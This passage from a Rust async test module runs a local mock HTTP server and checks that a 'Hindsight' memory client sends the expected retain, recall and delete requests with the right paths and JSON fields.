                    let n = s.read(&mut chunk).await.unwrap();
                    buf.extend_from_slice(&chunk[..n]);
                    let text = String::from_utf8_lossy(&buf).to_string();
                    if let Some(at) = text.find("\r\n\r\n") {
                        let len = text[..at].lines().find_map(|l| l.strip_prefix("Content-Length: ")).and_then(|v| v.trim().parse::<usize>().ok()).unwrap_or(0);
                        if buf.len() >= at + 4 + len {
                            break;
                        }
                    }
                    assert!(n > 0, "the client closed early");
                }
                seen.push(String::from_utf8_lossy(&buf).to_string());
                let code = if answer.is_empty() { "204 No Content" } else { "200 OK" };
                s.write_all(format!("HTTP/1.1 {code}\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{answer}", answer.len()).as_bytes()).await.unwrap();
            }
            seen
        });
        let h = Hindsight::new(&format!("http://127.0.0.1:{port}/v1/default")).unwrap();
        let item = Item { doc: "d1".into(), text: "t".into(), tags: vec!["room:r".into(), "author:a".into(), "status:accepted".into()], metadata: BTreeMap::from([("author_key".into(), "a".into())]) };
        h.retain("r", &item).await.unwrap();
        let hits = h.recall("r", &RecallRequest { query: "q".into(), max_tokens: 500, tags: vec!["room:r".into()] }).await.unwrap();
        assert_eq!(hits.len(), 1);
        assert_eq!(hits[0].doc.as_deref(), Some("d1"));
        h.delete("r", "d1").await.unwrap();
        let seen = server.await.unwrap();
        assert!(seen[0].starts_with("POST /v1/default/banks/r/memories HTTP/1.1"), "{}", seen[0]);
        assert!(seen[0].contains("\"document_id\":\"d1\"") && seen[0].contains("\"author_key\":\"a\"") && seen[0].contains("\"async\":true"), "{}", seen[0]);
        assert!(seen[1].starts_with("POST /v1/default/banks/r/memories/recall") && seen[1].contains("\"tags_match\":\"all_strict\""), "{}", seen[1]);
        assert!(seen[2].starts_with("DELETE /v1/default/banks/r/documents/d1 "), "{}", seen[2]);
    }
}
